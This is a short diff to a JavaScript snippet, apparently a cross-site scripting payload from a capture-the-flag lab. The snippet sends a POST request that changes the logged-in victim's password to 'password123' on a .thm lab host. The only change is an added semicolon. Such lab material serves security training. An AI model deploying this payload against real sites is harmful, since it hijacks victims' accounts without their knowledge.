@@ -1,4 +1,4 @@
 var req = new XMLHttpRequest();
 req.open('POST', 'http://login.worldwap.thm/change_password.php', true);
 req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-req.send('new_password=password123')
+req.send('new_password=password123');
